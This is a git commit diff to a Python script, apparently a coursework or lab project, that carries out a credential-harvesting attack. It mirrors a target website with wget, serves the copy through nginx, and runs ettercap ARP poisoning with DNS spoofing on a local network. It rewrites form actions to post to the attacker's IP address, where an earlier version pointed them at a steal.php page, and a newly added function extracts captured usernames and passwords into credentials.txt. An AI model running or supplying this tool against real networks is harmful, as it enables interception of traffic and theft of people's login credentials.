0eda46d75f277c78160ef1ca83d5715e96f46971
jenchen18 <jen.chen318@gmail.com>
2021-05-05 15:45:23 -0400

    Final

--- source.py
+++ source.py
@@ -3,7 +3,7 @@ import re
 import os
 
 FAKE_DOMAIN = "www.neverssl.com"
-SITE = "10.147.81.155"
+SITE = "10.202.208.103"
 
 def nginx_config():
 	path = "/etc/nginx/nginx.conf"
@@ -35,7 +35,6 @@ def ettercap_dns():
 	return 0
 
 def rewrite_posts(path):
-	print("***CHECKING ", path, "***")
 	with open(path, 'r', encoding='utf-8',errors='ignore') as file:
 		text = file.readlines()
 	for i in range(len(text)):
@@ -46,8 +45,7 @@ def rewrite_posts(path):
 				if "ACTION" in split_line[j].upper():
 					action = j + 1
 			if action < len(split_line):
-				text[i] = text[i].replace(split_line[action], "http://" + ip_addr() + "/steal.php")
-			print(text[i])
+				text[i] = text[i].replace(split_line[action], "http://" + ip_addr())
 	with open(path, 'w') as file:
 		file.writelines(text)
 	return 0
@@ -60,14 +58,25 @@ def parse_files(path):
 			rewrite_posts(path + "/" + file)
 	return 0
 
+def parse_user_pass():
+	with open("output.txt", 'r') as file:
+		text = file.readlines()
+	write_text = []
+	for i in range(len(text)):
+		if 'USER:' in text[i] and 'PASS:' in text[i]:
+			split_line = text[i].strip().split(" ")
+			write_text += [split_line[11] + " " + split_line[5] + ":" + split_line[8], "\n"]
+	with open("credentials.txt", 'w') as file:
+		file.writelines(write_text)
+	return 0
+
 def main():
-	#os.system("rm -r www.*")
-	os.system("wget --level=2 --recursive --page-requisites --no-parent --convert-links --adjust-extension --no-clobber -e robots=off " + SITE)
-	parse_files(SITE)
+	os.system("wget -x --force-directories --recursive --page-requisites --no-parent --convert-links --adjust-extension --no-clobber -e robots=off " + SITE)
 	nginx_config()
 	os.system("systemctl restart nginx")
 	ettercap_dns()
-	os.system("ettercap -i eth0 -T -q -M arp -P dns_spoof /// ///")
+	os.system("ettercap -i eth0 -T -q -M arp -P dns_spoof /// /// | tee output.txt")
+	parse_user_pass()
 	return 0
 
 if __name__ == '__main__':
